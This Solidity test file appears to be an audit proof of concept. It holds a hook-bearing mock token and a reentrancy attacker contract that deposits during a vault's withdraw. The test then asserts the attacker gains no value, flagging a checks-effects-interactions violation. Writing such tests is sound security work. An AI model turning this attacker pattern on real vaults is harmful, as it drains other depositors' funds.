// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@src/ContractA.sol";
import "@src/vendor/openzeppelin/token/ERC20/IERC20.sol";
import {ShareMath} from "@src/libraries/ShareMath.sol";

// IERC20 mock with a transfer-hook callback (ERC-777-style)
contract HookERC20 is IERC20 {
    mapping(address => uint256) internal _bal;
    mapping(address => mapping(address => uint256)) internal _allow;
    uint256 internal _total;

    address public hookTarget;
    bytes public hookData;
    bool public hookFired;

    function decimals() external pure override returns (uint8) { return 18; }
    function totalSupply() external view override returns (uint256) { return _total; }
    function balanceOf(address a) external view override returns (uint256) { return _bal[a]; }
    function allowance(address o, address s) external view override returns (uint256) { return _allow[o][s]; }
    function mint(address to, uint256 amt) external { _bal[to] += amt; _total += amt; }
    function setHook(address t, bytes calldata d) external { hookTarget = t; hookData = d; hookFired = false; }
    function clearHook() external { hookTarget = address(0); }

    function approve(address s, uint256 amt) external override returns (bool) {
        _allow[msg.sender][s] = amt; emit Approval(msg.sender, s, amt); return true;
    }
    function transfer(address to, uint256 amt) external override returns (bool) {
        require(_bal[msg.sender] >= amt, "bal");
        _bal[msg.sender] -= amt;
        _bal[to] += amt;
        emit Transfer(msg.sender, to, amt);
        // ERC-777 receiver hook fires after credit, before caller resumes
        if (hookTarget != address(0) && !hookFired) {
            hookFired = true;
            (bool ok,) = hookTarget.call(hookData);
            ok; // ignore — re-entry is the point
        }
        return true;
    }
    function transferFrom(address from, address to, uint256 amt) external override returns (bool) {
        require(_bal[from] >= amt, "bal");
        require(_allow[from][msg.sender] >= amt, "allow");
        _bal[from] -= amt;
        _allow[from][msg.sender] -= amt;
        _bal[to] += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

// Attacker that re-enters via deposit during the withdraw's asset.transfer hook.
// Exploits the CEI violation: vault's asset balance is temporarily depressed
// (transfer happened, share state not yet updated), so deposit mints shares
// at an inflated rate.
contract ReentrantArbAttacker {
    ContractA public vault;
    HookERC20 public asset;
    uint256 public spareCash;
    bool public hookCalled;

    constructor(ContractA _vault, HookERC20 _asset) {
        vault = _vault;
        asset = _asset;
    }

    function setSpareCash(uint256 amt) external { spareCash = amt; }

    // Hook callback: called during the asset.transfer in vault.withdraw.
    // At this moment: vault has already paid out tokens (balance depressed)
    // but share state is not yet updated. Deposit here mints shares at a
    // ratio computed from the depressed balance → arbitrage profit.
    function reenterAsDeposit() external {
        if (hookCalled) return;
        hookCalled = true;
        asset.approve(address(vault), spareCash);
        vault.deposit(spareCash, address(this));
    }

    function startAttack(uint256 sharesToWithdraw) external {
        vault.withdraw(sharesToWithdraw, address(this));
    }
}

contract SOLD1_VaultReentrancyArbTest is Test {
    ContractA public vault;
    HookERC20 public asset;
    ReentrantArbAttacker public attacker;

    address public admin;
    address public feeRecipient;
    address public innocent;

    function setUp() public {
        admin       = makeAddr("admin");
        feeRecipient = makeAddr("feeRecipient");
        innocent    = makeAddr("innocent");

        asset = new HookERC20();

        // Deploy vault: feeBps=0, withdrawalDelay=0 (no friction for clean math)
        vault = new ContractA(IERC20(address(asset)), admin, feeRecipient, 0, 0);

        attacker = new ReentrantArbAttacker(vault, asset);

        // Mint: innocent 900, attacker 200 (100 to deposit + 100 spare for arb)
        asset.mint(innocent, 900e18);
        asset.mint(address(attacker), 200e18);

        // Innocent deposits 900 → gets 900 shares
        vm.startPrank(innocent);
        asset.approve(address(vault), 900e18);
        vault.deposit(900e18, innocent);
        vm.stopPrank();

        // Attacker deposits 100 from its 200, holds 100 spare for the re-entry
        vm.startPrank(address(attacker));
        asset.approve(address(vault), 100e18);
        vault.deposit(100e18, address(attacker));
        vm.stopPrank();

        // Sanity: vault has 1000 tokens, 1000 shares (1:1 pre-attack)
        assertEq(asset.balanceOf(address(vault)), 1000e18, "setup vault balance");
        assertEq(vault.totalShares(), 1000e18, "setup total shares");
        assertEq(vault.shareBalance(address(attacker)), 100e18, "attacker shares");
        assertEq(asset.balanceOf(address(attacker)), 100e18, "attacker spare cash");
    }

    function test_vault_withdraw_reentrancy_arb_drain() public {
        // Configure attacker spare for the deposit-during-hook
        attacker.setSpareCash(100e18);

        // Arm the asset hook to call attacker.reenterAsDeposit() during transfer
        bytes memory hookData = abi.encodeWithSelector(ReentrantArbAttacker.reenterAsDeposit.selector);
        asset.setHook(address(attacker), hookData);

        // Snapshot attacker's total economic position pre-attack
        uint256 attackerSharesBefore = vault.shareBalance(address(attacker));
        uint256 attackerCashBefore   = asset.balanceOf(address(attacker));
        uint256 attackerWealthBefore = attackerCashBefore +
            ShareMath.toAssets(attackerSharesBefore, vault.totalShares(), asset.balanceOf(address(vault)));

        // Execute: attacker withdraws its 100 shares.
        // During the asset.transfer (line 54 of withdraw), the vault's balance
        // is depressed BUT share state hasn't been updated yet (CEI violation).
        // The hook fires → attacker calls vault.deposit(100, attacker) with its
        // spare cash. deposit() reads the depressed vault balance and mints
        // shares at an inflated ratio. Outer withdraw then proceeds to burn the
        // attacker's original 100 shares.
        vm.prank(address(attacker));
        attacker.startAttack(100e18);

        // Compute attacker's wealth after the attack
        uint256 attackerSharesAfter = vault.shareBalance(address(attacker));
        uint256 attackerCashAfter   = asset.balanceOf(address(attacker));
        uint256 attackerWealthAfter = attackerCashAfter +
            ShareMath.toAssets(attackerSharesAfter, vault.totalShares(), asset.balanceOf(address(vault)));

        // INVARIANT — under correct CEI ordering, attacker cash + share value
        // post-attack should equal pre-attack wealth (zero-sum re-entry can't
        // arbitrage). Under the bug, attacker captures value from innocent
        // because deposit during the hook ran against a depressed vault balance.
        assertLe(
            attackerWealthAfter,
            attackerWealthBefore,
            "BUG: attacker extracted value via deposit-during-withdraw-hook arbitrage (CEI violation in ContractA.withdraw lines 54 -> 62)"
        );
    }
}
